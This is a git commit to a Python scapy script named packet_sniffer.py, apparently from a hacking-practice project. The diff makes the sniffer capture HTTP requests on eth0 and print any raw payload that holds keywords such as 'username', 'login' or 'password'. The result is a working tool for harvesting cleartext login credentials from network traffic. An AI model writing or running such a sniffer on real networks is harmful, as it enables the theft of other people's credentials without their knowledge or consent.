ad9596a7bc84308f44ca38b63380ba24ebf9f497
Sepp1324 <stoegerer.sebastian@aon.at>
2020-05-23 15:54:32 +0000

    HTTP-Sniffing

--- packet_sniffer/packet_sniffer.py
+++ packet_sniffer/packet_sniffer.py
@@ -8,6 +8,14 @@ def sniff(interface):
 
 def process_sniffed_packet(packet):
 	if packet.haslayer(http.HTTPRequest):
-		print(packet)
+		if packet.haslayer(scapy.Raw):
+			load = packet[scapy.Raw].load
+			user_keys = ["username", "UserName", "user", "login", "password", "pass"]
+
+			for user_key in user_keys:
+				if user_key in load:
+					print(load)
+					break
+
 
 sniff("eth0")
